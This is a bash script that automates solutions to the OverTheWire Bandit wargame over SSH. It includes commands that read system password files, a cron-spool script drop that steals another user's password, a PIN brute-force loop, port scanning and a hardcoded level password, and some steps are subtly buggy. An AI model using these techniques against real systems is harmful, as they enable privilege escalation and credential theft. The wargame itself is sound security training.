#!/bin/bash

#VARIABLES
MAX_LEVEL=28
PASSWORD="bandit0"

if ! [[ "$1" =~ ^[0-9]+$ ]]; then
	echo "Error: argument must be a number"
	exit 1
fi
if [ "$1" -lt 1 ]; then
	echo "Error: level must be >= 1"
	exit 1
fi
if [ "$1" -gt "$MAX_LEVEL" ]; then
  SOLVE_UNTIL=$MAX_LEVEL
else
  SOLVE_UNTIL=$1
fi
RESUME=$((SOLVE_UNTIL-1))

PASSWORD_FILE="bandit_passwords"

touch "$PASSWORD_FILE"
grep -qxF "0:bandit0" "$PASSWORD_FILE" 2>/dev/null || echo "0:bandit0" >> "$PASSWORD_FILE"


#HELPER FUNCTIONS
get_password() {
	grep "^$1:" "$PASSWORD_FILE" 2>/dev/null | cut -d ':' -f2
}

save_password() {
	grep -v "^$1:" "$PASSWORD_FILE" > "$PASSWORD_FILE.tmp"
	echo "$1:$2" >> "$PASSWORD_FILE.tmp"
	mv "$PASSWORD_FILE.tmp" "$PASSWORD_FILE"
}

remove_password() {
	grep -v "^$1:" "$PASSWORD_FILE" > "$PASSWORD_FILE.tmp"
	mv "$PASSWORD_FILE.tmp" "$PASSWORD_FILE"
}

test_password() {
	if [[ "$1" -eq 26 ]]; then
        return 1
    fi
	sshpass -p "$2" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p 2220 \
		bandit"$1"@bandit.labs.overthewire.org "echo ok" 2>/dev/null | grep -q ok
}


#SOLVERS FOR EACH LEVEL
solve_level_0() {
	cat readme | tr ' ' '\n' | grep '^[a-zA-Z0-9]\{32\}$'
}

solve_level_1() {
	cat ./-
}

solve_level_2() {
	FILE_PATH=$(ls)
	cat ./"$FILE_PATH"
}

solve_level_3() {
	cd inhere
	FILE_PATH=$(ls -a | tail -n 1)
	cat "$FILE_PATH"
}

solve_level_4() {
	cd inhere
	FILE_PATH=$(file ./-file* | grep ASCII | tr ':' '\n' | head -n 1)
	cat "$FILE_PATH"
}

solve_level_5() {
	FILE_PATH=$(file "$(find -size 1033c -not -executable)" | grep ASCII | tr ':' '\n' | head -n 1)
	cat "$FILE_PATH" | head -n 1
}

solve_level_6() {
	FILE_PATH=$(find / -size 33c -user bandit7 -group bandit6 2>/dev/null)
	cat "$FILE_PATH"
}

solve_level_7() {
	grep "millionth" data.txt | awk '{print $2}'
}

solve_level_8() {
	sort data.txt | uniq -u
}

solve_level_9() {
	strings data.txt | grep "^===" | tr -d '= ' | tail -n 1
}

solve_level_10(){
	base64 -d data.txt | tr ' ' '\n' | tail -n 1
}

solve_level_11(){
	cat data.txt | tr '[a-zA-Z]' '[n-za-mN-ZA-M]' | tr ' ' '\n' | tail -n 1
}

solve_level_12(){
	TEMP_DIR=$(mktemp -d)
	cd "$TEMP_DIR"
	cp ~/data.txt ./hex.txt
	xxd -r hex.txt > data.txt
	rm hex.txt
	FILE_NAME="data.txt"

	while true; do
		FILE_OUTPUT=$(file * | tr ' ' '\n' | head -n 2 | grep -v "$FILE_NAME")
		
		if [[ "$FILE_OUTPUT" == *gzip* ]]; then
			mv "$FILE_NAME" "$FILE_NAME.gz"
			gzip -d "$FILE_NAME.gz"
		elif [[ "$FILE_OUTPUT" == *bzip2* ]]; then
			bzip2 -d "$FILE_NAME"
			FILE_NAME="$FILE_NAME.out"
		elif [[ "$FILE_OUTPUT" == *POSIX* ]]; then
			tar -xf "$FILE_NAME"
			rm "$FILE_NAME"
			FILE_NAME=$(find . -maxdepth 1 -type f | head -n 1)
			FILE_NAME="${FILE_NAME#./}"
		else
			break
		fi
	done
	cat "$FILE_NAME" | tr ' ' '\n' | tail -n 1
}

solve_level_13(){
	LVL13_PASSWORD=$(get_password 13)
	LVL13_SSHKEY="./sshkey_lvl13.private"
	
	sshpass -p "$LVL13_PASSWORD" \
	scp -P 2220 \
		-o StrictHostKeyChecking=no \
		-o LogLevel=ERROR \
		bandit13@bandit.labs.overthewire.org:~/sshkey.private \
		"$LVL13_SSHKEY"

	chmod 600 "$LVL13_SSHKEY"

	ssh -i "$LVL13_SSHKEY" \
		-o StrictHostKeyChecking=no -o LogLevel=ERROR \
		-p 2220 bandit14@bandit.labs.overthewire.org \
		"cat /etc/bandit_pass/bandit14"
}

solve_level_14(){
	LVL14_PASSWORD=$(get_password 14)
	RESPONSE=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o LogLevel=ERROR -p 2220 \
			bandit$i@bandit.labs.overthewire.org "
			echo "$LVL14_PASSWORD" | nc localhost 30000
			" 2>/dev/null)
	echo "$RESPONSE" | tail -n 1
}

solve_level_15(){
	LVL15_PASSWORD=$(get_password 15)
	RESPONSE=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o LogLevel=ERROR -p 2220 \
			bandit$i@bandit.labs.overthewire.org "
			printf '%s\n' '$LVL15_PASSWORD' | openssl s_client -quiet -connect localhost:30001 -servername localhost 2>/dev/null
			")
	echo "$RESPONSE" | tr ' ' '\n' | tail -n 1
}

solve_level_16(){
	LVL16_PASSWORD=$(get_password 16)
	LVL17_SSHKEY="./sshkey_lvl17.private"
	touch "$LVL17_SSHKEY"
	RESPONSE=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o LogLevel=ERROR -p 2220 \
			bandit$i@bandit.labs.overthewire.org "
			for p in \$(nmap localhost -p 31000-32000 | tr '/tcp' '\n'| grep -E '^[0-9]{5}$'); do 
				printf '%s\n' "$LVL16_PASSWORD" | 
				openssl s_client -quiet -connect localhost:\$p -servername localhost 2>/dev/null 
			done
			")
	printf '%s\n' "$RESPONSE" | awk '
	/BEGIN RSA PRIVATE KEY/,/END RSA PRIVATE KEY/ {print}
	' > "$LVL17_SSHKEY"
	chmod 600 "$LVL17_SSHKEY"
}

retrieve_pw_16(){
	LVL17_SSHKEY="./sshkey_lvl17.private"
	ssh -i "$LVL17_SSHKEY" \
		-o StrictHostKeyChecking=no -o LogLevel=ERROR \
		-p 2220 bandit17@bandit.labs.overthewire.org \
		"cat /etc/bandit_pass/bandit17"
}

solve_level_17(){
	diff passwords.old passwords.new | grep '>' | awk '{print $NF}'
}

solve_level_18(){
	cat readme
}

solve_level_19(){
	FILE_PATH=$(ls)
	./"$FILE_PATH" cat /etc/bandit_pass/bandit20
}

solve_level_20(){
	LVL20_PASSWORD=$(get_password 20)
	RESPONSE=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o LogLevel=ERROR -p 2220 \
			bandit$i@bandit.labs.overthewire.org "
			echo "$LVL20_PASSWORD" | nc -l -p 12345 &
			LISTENER_PID=\$!
			./\$(ls) 12345
			kill "\$LISTENER_PID" 2>/dev/null
			")
	echo $RESPONSE | awk '{print $1}'
}

solve_level_21(){
	SCRIPT=$(cat /etc/cron.d/cronjob_bandit22 | tr ' ' '\n' | tail -n 3 | head -n 1)
	TMP_FILE=$(cat "$SCRIPT" | tr ' ' '\n' | tail -n 1)
	cat "$TMP_FILE"
}

solve_level_22(){
	TEMP_FILE=$(echo I am user bandit23 | md5sum  | cut -d ' ' -f 1)
	cat "/tmp/$TEMP_FILE"
}

solve_level_23(){
	TEMP_DIR=$(mktemp -d)
	cd "$TEMP_DIR"
	chmod 777 "$TEMP_DIR"

	touch password
	chmod 666 password

	touch script.sh
	chmod 777 script.sh

	echo "#!/bin/bash
	cat /etc/bandit_pass/bandit24 > $TEMP_DIR/password" > script.sh

	mv script.sh /var/spool/bandit24/foo/

	while [ -e /var/spool/bandit24/foo/script.sh ] 2>/dev/null; do
		sleep 1
	done

	cat password
}

solve_level_24(){
	TEMP_DIR=$(mktemp -d)
	cd "$TEMP_DIR"

	touch password
	chmod 777 password

	for i in {0000..9999}; do
			echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
	done | nc localhost 30002 | grep -v "Wrong"  > $TEMP_DIR/password

	cat /tmp/tmp.unTFXHZoLQ/password | tr ' ' '\n' | grep -E '^[A-Za-z0-9]{32}$'
}

retrieve_key_26(){
	LVL25_PASSWORD=$(get_password 25)
	LVL26_SSHKEY="./sshkey_lvl26.private"
	
	sshpass -p "$LVL25_PASSWORD" \
	scp -P 2220 \
		-o StrictHostKeyChecking=no \
		-o LogLevel=ERROR \
		bandit25@bandit.labs.overthewire.org:~/bandit26.sshkey \
		"$LVL26_SSHKEY"

	chmod 600 "$LVL26_SSHKEY"
}

solve_level_27(){
	(
	LVL27_PASSWORD=$(get_password 27)
	REPO_PATH="git_repos_private"
	if [[ ! -d "$REPO_PATH" ]]; then
			mkdir "$REPO_PATH"
	fi
	cd "$REPO_PATH"
	if [[ ! -d "lvl27" ]]; then
		GIT_SSH_COMMAND="sshpass -p '$LVL27_PASSWORD' ssh -o StrictHostKeyChecking=no -p 2220" \
		git clone ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo
		mv repo/ lvl27/
	fi
	cd lvl27
	cat README | awk '{print $NF}'
	)
}

#CACHE FUNCTION
for ((i=$((SOLVE_UNTIL-1)); i > 0; i--)); do
	echo "Testing caché for level $i"
	CACHED_PASS=$(get_password "$i")
	if [ -n "$CACHED_PASS" ] && test_password "$i" "$CACHED_PASS"; then
		PASSWORD="$CACHED_PASS"
		echo "Found valid password for level $i"
		break
	else
		remove_password "$i"
		RESUME=$((RESUME-1))
	fi
done


#MAIN FUNCTION
for ((i=$RESUME; i<SOLVE_UNTIL; i++)); do

	NEXT=$((i+1))
	CMD="solve_level_$i"

	echo "Level $i -> $NEXT"

	if [[ "$i" -eq 13 || "$i" -eq 14 || "$i" -eq 15 || "$i" -eq 20 || ("$i" -ge 27 && "$i" -le 31) ]]; then
		PASSWORD=$($CMD)
	elif [[ "$i" -eq 16 ]]; then
		$CMD
		PASSWORD=$(retrieve_pw_16)
	elif [[ "$i" -eq 25 || "$i" -eq 26 ]]; then
		SOLVER="solver_$i.py"
		if [[ ! -f "sshkey_lvl26.private" ]]; then
			retrieve_key_26
		fi
		PASSWORD=$(python3 $SOLVER)
	else
		PASSWORD=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o LogLevel=ERROR -p 2220 \
			bandit$i@bandit.labs.overthewire.org "
			$(declare -f $CMD)
			$CMD
			" 2>/dev/null)
	fi

	save_password "$NEXT" "$PASSWORD"
	echo "Password for level $NEXT: $PASSWORD"
done
